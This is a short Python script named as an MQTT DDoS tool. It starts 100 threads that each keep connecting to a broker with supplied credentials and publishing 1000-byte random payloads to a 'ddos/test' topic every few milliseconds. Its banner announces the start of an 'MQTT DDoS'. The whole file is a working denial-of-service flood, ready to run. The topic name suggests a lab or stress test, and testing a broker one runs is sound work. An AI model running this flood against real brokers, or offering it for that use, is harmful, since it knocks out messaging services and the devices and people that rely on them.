# mqtt_ddos_auth.py
import os
import paho.mqtt.client as mqtt
import threading
import time
import random
import string

BROKER = os.getenv("BROKER_ADDRESS", "mqtt-broker")
PORT = int(os.getenv("PORT", "1883"))
USERNAME = os.getenv("MQTT_USERNAME", "")
PASSWORD = os.getenv("MQTT_PASSWORD", "")
TOPIC = "ddos/test"

def flood():
    while True:
        try:
            client_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            client = mqtt.Client(client_id=client_id)
            client.username_pw_set(USERNAME, PASSWORD)
            client.connect(BROKER, PORT, 60)
            for _ in range(10):
                payload = ''.join(random.choices(string.ascii_letters, k=1000))
                client.publish(TOPIC, payload)
            client.disconnect()
        except Exception as e:
            print(f"[ERROR] {e}")
        time.sleep(0.05)

# Launch multiple threads
for _ in range(100):  # Increase if your system allows it
    threading.Thread(target=flood, daemon=True).start()

print("🔫 Starting MQTT DDoS with AUTH...")
while True:
    time.sleep(1)

